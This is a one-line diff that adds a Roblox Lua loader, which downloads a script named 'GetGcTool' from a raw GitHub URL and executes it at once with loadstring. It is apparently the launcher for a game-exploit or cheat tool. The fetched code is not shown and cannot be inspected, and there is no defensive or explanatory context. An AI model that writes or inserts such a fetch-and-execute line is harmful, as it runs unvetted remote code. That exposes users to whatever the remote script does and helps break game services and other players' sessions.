@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/TexchyBackup/Shitpost/refs/heads/main/GetGcTool"))()
